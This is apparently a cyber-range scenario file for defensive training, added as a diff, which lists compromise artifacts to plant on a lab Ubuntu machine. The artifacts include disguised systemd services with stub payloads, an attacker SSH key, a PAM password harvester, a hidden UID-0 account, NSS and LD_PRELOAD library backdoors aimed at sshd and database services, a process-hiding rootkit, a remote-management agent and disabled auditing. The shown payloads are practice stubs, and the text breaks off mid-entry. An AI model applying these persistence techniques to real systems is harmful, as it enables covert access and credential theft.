@@ -1,0 +1,704 @@
+{
+  "machines": [
+    {
+      "id": 1,
+      "name": "acme-underpressure-01",
+      "ip": "REPLACED-BY-PROVIDER",
+      "user": "REPLACED-BY-PROVIDER",
+      "password": "REPLACED-BY-PROVIDER",
+      "os": "ubuntu-xfce",
+      "port": 22,
+      "configurations": [
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "dbus-resolver",
+            "DESCRIPTION": "D-Bus name resolver",
+            "EXEC_START": "/usr/sbin/dbus-resolver --resolve",
+            "PAYLOAD_PATH": "/usr/sbin/dbus-resolver",
+            "PAYLOAD_BODY": "#!/bin/sh\n# dbus-resolver practice stub\nsleep 30",
+            "MTIME": "2022-03-23 09:00:00"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "systemd-journal-flush-helper",
+            "DESCRIPTION": "Journal flush helper",
+            "EXEC_START": "/usr/local/sbin/dbus-resolve",
+            "PAYLOAD_PATH": "/usr/local/sbin/dbus-resolve",
+            "PAYLOAD_BODY": "#!/bin/sh\n# dbus-resolve practice stub\nsleep 5",
+            "EXTRA_LINE": "RestartSec=5"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "neigh-gcd",
+            "DESCRIPTION": "Kernel neigh-gcd daemon",
+            "EXEC_START": "/usr/local/sbin/neigh-gcd",
+            "PAYLOAD_PATH": "/usr/local/sbin/neigh-gcd",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "net-uevtd",
+            "DESCRIPTION": "Kernel net-uevtd daemon",
+            "EXEC_START": "/usr/local/sbin/net-uevtd",
+            "PAYLOAD_PATH": "/usr/local/sbin/net-uevtd",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "oom-adjd",
+            "DESCRIPTION": "Kernel oom-adjd daemon",
+            "EXEC_START": "/usr/local/sbin/oom-adjd",
+            "PAYLOAD_PATH": "/usr/local/sbin/oom-adjd",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "net-pathd",
+            "DESCRIPTION": "Kernel net-pathd daemon",
+            "EXEC_START": "/usr/local/sbin/net-pathd",
+            "PAYLOAD_PATH": "/usr/local/sbin/net-pathd",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "sys-paramd",
+            "DESCRIPTION": "Kernel sys-paramd daemon",
+            "EXEC_START": "/usr/local/sbin/sys-paramd",
+            "PAYLOAD_PATH": "/usr/local/sbin/sys-paramd",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "if-aliasd",
+            "DESCRIPTION": "Kernel if-aliasd daemon",
+            "EXEC_START": "/usr/local/sbin/if-aliasd",
+            "PAYLOAD_PATH": "/usr/local/sbin/if-aliasd",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "backdoored-core-utils",
+          "vars": {}
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "sshd-session",
+            "DESCRIPTION": "SSH session monitor",
+            "EXEC_START": "/usr/sbin/sshd-session",
+            "PAYLOAD_PATH": "/usr/sbin/sshd-session",
+            "PAYLOAD_BODY": "#!/bin/sh\nsleep 60"
+          }
+        },
+        {
+          "name": "attacker-authorized-keys",
+          "vars": {
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGs9vuj+ApoHXWsd4XZcZXJePKhRVWpLNzfE6ddQlD8A cyberrange-lab",
+            "USERNAME": "acmeadmin"
+          }
+        },
+        {
+          "name": "pam-exec-authtok-harvester",
+          "vars": {
+            "MODULE_PATH": "/usr/share/locale/en/unicode.so",
+            "PAM_FILE": "/etc/pam.d/common-password"
+          }
+        },
+        {
+          "name": "multiple-uid0-accounts",
+          "vars": {
+            "ACCOUNTS": "svc-health",
+            "PASSWORD_HASH": "$6$Mg3j3L4zsboSN1du$Ce6LDkLUCrVX63xGWsWd9zMBCfRf170l7dg6.Om9usPlQ9N3/g..Yliz/afNFz7pmdcg.2cq7USfCyGXbhuYI/"
+          }
+        },
+        {
+          "name": "passwd-inline-hash",
+          "vars": {
+            "USERNAME": "svc-health",
+            "HASH": "$6$Mg3j3L4zsboSN1du$Ce6LDkLUCrVX63xGWsWd9zMBCfRf170l7dg6.Om9usPlQ9N3/g..Yliz/afNFz7pmdcg.2cq7USfCyGXbhuYI/"
+          }
+        },
+        {
+          "name": "nss-module-backdoor",
+          "vars": {
+            "LIB_PATH": "/lib/x86_64-linux-gnu/libnss_cache.so.2"
+          }
+        },
+        {
+          "name": "systemd-dropin-ldpreload",
+          "vars": {
+            "LIB_PATH": "/usr/lib/libudev-cache.so.1",
+            "SO_B64": "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAAKAgAAAAAAAAAAAAAEAAOAAIAEAACwAKAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqBAAAAAAAACoEAAAAAAAAAAQAAAAAAAAAQAAAAYAAABQHwAAAAAAAFAvAAAAAAAAUC8AAAAAAACwAAAAAAAAALgAAAAAAAAAABAAAAAAAAACAAAABgAAAFAfAAAAAAAAUC8AAAAAAABQLwAAAAAAALAAAAAAAAAAsAAAAAAAAAAIAAAAAAAAAAQAAAAEAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAABAAAAAQAAAB4EAAAAAAAAHgQAAAAAAAAeBAAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAABT5XRkBAAAAHgQAAAAAAAAeBAAAAAAAAB4EAAAAAAAADAAAAAAAAAAMAAAAAAAAAAIAAAAAAAAAFHldGQGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAUuV0ZAQAAABQHwAAAAAAAFAvAAAAAAAAUC8AAAAAAACwAAAAAAAAALAAAAAAAAAAAQAAAAAAAAAEAAAAFAAAAAMAAABHTlUACoByZnk/aruQXpcspeVsm20mdtQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAQAAAAYAAAACAAAAAAEAAAEAAAAAAAAAabC3HwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEQAIAAAwAAAAAAAABAAAAAAAAAAAaHpfcHJhY3RpY2Vfc3R1Yl9hbmNob3IAAAAAAAAAAAQAAAAgAAAABQAAAEdOVQABAAHABAAAAAEAAAAAAAAAAgABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9f7/bwAAAAAAEAAAAAAAAAUAAAAAAAAAWBAAAAAAAAAGAAAAAAAAACgQAAAAAAAACgAAAAAAAAAZAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDE2LjIuMSAyMDI2MTAyOSAoUmVkIEhhdCAxNi4yLjEtMykAAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZWhfZnJhbWUALm5vdGUuZ251LnByb3BlcnR5AC5keW5hbWljAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAHAAAAAgAAAAAAAAAAAgAAAAAAAAACAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAeAAAA9v//bwIAAAAAAAAAABAAAAAAAAAAEAAAAAAAACQAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAKAAAAAsAAAACAAAAAAAAACgQAAAAAAAAKBAAAAAAAAAwAAAAAAAAAAQAAAABAAAACAAAAAAAAAAYAAAAAAAAADAAAAADAAAAAgAAAAAAAABYEAAAAAAAAFgQAAAAAAAAGQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA4AAAAAQAAAAIAAAAAAAAAeBAAAAAAAAB4EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQgAAAAcAAAACAAAAAAAAAHgQAAAAAAAAeBAAAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAFUAAAAGAAAAAwAAAAAAAABQLwAAAAAAAFAfAAAAAAAAsAAAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAABeAAAACAAAAAMAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAYwAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAC4gAAAAAAAAbAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=",
+            "DROPIN_NAME": "zz-udev-cache.conf",
+            "SERVICES": "sshd.service ssh.service mongod.service vault.service apache2.service mariadb.service"
+          }
+        },
+        {
+          "name": "ld-so-preload-rootkit",
+          "vars": {
+            "LIB_PATH": "/usr/lib/libprocesshider.so"
+          }
+        },
+        {
+          "name": "meshcentral-rmm-agent",
+          "vars": {
+            "FILE_PATH": "/usr/local/mesh_services/meshagent/meshagent",
+            "MESH_NAME": "ACME Environment",
+            "SERVICE_NAME": "meshagent"
+          }
+        },
+        {
+          "name": "hacking-tools-installed",
+          "vars": {}
+        },
+        {
+          "name": "auditd-disabled",
+          "vars": {}
+        },
+        {
+          "name": "file-drop",
+          "vars": {
